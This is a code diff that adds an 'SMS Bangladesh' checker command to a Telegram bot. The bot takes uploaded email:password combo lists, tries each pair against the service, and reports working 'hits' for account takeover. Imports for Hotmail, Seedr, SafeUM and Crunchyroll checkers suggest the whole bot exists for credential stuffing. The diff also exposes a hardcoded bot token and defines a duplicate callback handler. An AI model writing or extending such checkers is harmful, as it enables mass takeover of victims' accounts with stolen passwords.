@@ -11,6 +11,7 @@ import os
 import sys
 import hotmail
 import seedr
+from smsbd import check_smsbd, get_footer_info
 from safeum import create_accounts, get_footer_info
 
 TOKEN = '7422696256:AAHV6Df2UShvfvrlFMTkSX8cki6KAMl0T7w'
@@ -210,6 +211,100 @@ def callback_query(call):
         bot.send_message(chat_id, f"Dead Accounts:\n{dead_list}")
     elif cmd == 'total':
         pass  # Do nothing
+
+@bot.message_handler(commands=['smsbd'])
+def smsbd_command(message):
+    if message.reply_to_message and message.reply_to_message.document:
+        if message.reply_to_message.document.mime_type == 'text/plain':
+            file_info = bot.get_file(message.reply_to_message.document.file_id)
+            downloaded_file = bot.download_file(file_info.file_path)
+            file_content = downloaded_file.decode('utf-8')
+
+            chat_id = message.chat.id
+            username = message.from_user.username
+
+            # Start a new thread to handle the file processing
+            threading.Thread(target=process_smsbd, args=(chat_id, username, file_content)).start()
+        else:
+            bot.reply_to(message, "Please reply to a valid txt file.")
+    else:
+        bot.reply_to(message, "Please reply to a txt file with the /smsbd command.")
+
+def process_smsbd(chat_id, username, file_content):
+    total_accounts = file_content.splitlines()
+    start_time = time.time()
+    hits = []
+    dead = []
+
+    footer_info = get_footer_info(len(total_accounts), start_time, username)
+    initial_message = "Checking Your Accounts.\n\n" + footer_info
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton(f"Hit ✅: {len(hits)}", callback_data=f"{chat_id}:hit"))
+    markup.add(types.InlineKeyboardButton(f"Dead ❌: {len(dead)}", callback_data=f"{chat_id}:dead"))
+
+    msg = bot.send_message(chat_id, initial_message, reply_markup=markup)
+
+    for account in total_accounts:
+        email, password = account.split(":", 1)
+        result, response_message = check_smsbd(email, password)
+        if result == 'Hit':
+            hits.append(account)
+        else:
+            dead.append(account)
+
+        chat_data[chat_id] = {
+            'hits': hits,
+            'dead': dead,
+            'total_accounts': total_accounts
+        }
+
+        live_update = (
+            f"↯ SMS BANGLADESH CHECKER\n"
+            f"➣COMBO: {account}\n"
+            f"➣Result: {result}\n"
+            f"✦Response: {response_message}\n\n" + footer_info
+        )
+
+        # Update inline buttons with live count
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton(f"Hit ✅: {len(hits)}", callback_data=f"{chat_id}:hit"))
+        markup.add(types.InlineKeyboardButton(f"Dead ❌: {len(dead)}", callback_data=f"{chat_id}:dead"))
+
+        bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=live_update, reply_markup=markup)
+
+    final_message = (
+        f"↯ SMS BANGLADESH CHECKER\n\nGAME OVER⚡️\n\n"
+        f"Total Hits: {len(hits)}\n"
+        f"Total Dead: {len(dead)}\n"
+        f"－－－－－－－－－－－－－－－－\n"
+        f"🔹 Total Accounts Checked - {len(total_accounts)}\n"
+        f"⏱️ Time Taken - {round(time.time() - start_time, 2)} seconds\n"
+        f"▫️ Checked by: {username}\n"
+        f"⚡️ Bot by - AFTAB 👑\n"
+        f"－－－－－－－－－－－－－－－－"
+    )
+    bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=final_message, reply_markup=markup)
+
+    if hits:
+        bot.send_message(chat_id, f"HITS[SMSBD]:\n{'\n'.join(hits)}")
+
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+    chat_id = call.message.chat.id
+    data = call.data.split(':')
+    cmd = data[1]
+
+    if chat_id not in chat_data:
+        bot.answer_callback_query(call.id, "No data available for this chat.")
+        return
+
+    if cmd == 'hit':
+        hits_list = '\n'.join(chat_data[chat_id].get('hits', [])) if chat_data[chat_id].get('hits') else 'No hits yet.'
+        bot.send_message(chat_id, f"HITS[SMSBD]:\n{hits_list}")
+    elif cmd == 'dead':
+        dead_list = '\n'.join(chat_data[chat_id].get('dead', [])) if chat_data[chat_id].get('dead') else 'No dead accounts yet.'
+        bot.send_message(chat_id, f"Dead Accounts:\n{dead_list}")
 
 @bot.message_handler(commands=['crunchy'])
 def crunchy_command(message):
